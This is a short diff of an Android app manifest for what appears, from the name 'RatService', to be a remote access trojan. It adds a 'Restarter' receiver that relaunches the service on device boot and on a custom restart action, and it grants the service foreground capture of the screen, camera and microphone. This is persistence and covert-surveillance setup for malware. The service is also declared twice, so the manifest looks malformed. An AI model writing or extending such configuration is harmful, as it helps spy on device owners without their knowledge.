@@ -39,6 +39,21 @@
         </activity>
 <service
     android:name=".RatService"
+    android:enabled="true"
+    android:exported="false" />
+
+<receiver
+    android:name=".Restarter"
+    android:enabled="true"
+    android:exported="false">
+    <intent-filter>
+        <action android:name="restart_service_action" />
+        <action android:name="android.intent.action.BOOT_COMPLETED" />
+    </intent-filter>
+</receiver>
+
+<service
+    android:name=".RatService"
     android:foregroundServiceType="mediaProjection|camera|microphone" />
 
         <service
